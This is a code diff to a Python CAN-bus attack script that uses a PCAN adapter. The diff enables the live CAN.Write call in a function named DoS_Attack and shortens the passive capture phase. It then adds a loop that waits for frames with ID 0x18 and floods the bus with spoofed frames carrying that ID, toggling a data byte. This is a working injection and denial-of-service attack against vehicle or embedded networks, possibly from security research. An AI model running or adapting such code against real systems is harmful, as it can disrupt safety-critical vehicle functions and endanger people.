@@ -50,7 +50,7 @@ def DoS_Attack(id, data):
         # all_datas += data[i]+ "\t"
 
     print(all_datas)
-    # CAN.Write(CAN_BUS, DoS_DATA)
+    CAN.Write(CAN_BUS, DoS_DATA)
     # time.sleep(time_offset)
 
 if __name__ == "__main__":
@@ -59,6 +59,7 @@ if __name__ == "__main__":
     counter = 0
     start_time = time.time()
     ind = 0
+    injected = False
     result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
     if result != PCAN_ERROR_OK:
         # An error occurred, get a text describing the error and show it
@@ -94,10 +95,34 @@ if __name__ == "__main__":
                 all_data += "\n"
                 time.sleep(0.1)
                 os.system("cls")
-        if time.time() - start_time > 100:
+        if time.time() - start_time > 5:
             os.system("cls")
             print("Phase #1 has done")
             break
     while True:
-
-        
+        injection_id = "0018"
+        mess = CAN.Read(CAN_BUS)
+        k = 2
+        for _ in range(k):
+            if hex(mess[1].ID) == "0x18":
+                # for j in range(8):
+                #     print(hex(mess[1].DATA[j]), end = " ")
+                # print()
+                time.sleep(0.03/k)
+                if injected:
+                    using_bytes[5] = msg_dict[5][0][0]
+                    injected = False
+                    DoS_Attack(injection_id, using_bytes)
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
+                    
+                else:
+                    using_bytes[5] = msg_dict[5][0][1]
+                    injected = True
+                    DoS_Attack(injection_id, using_bytes)
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
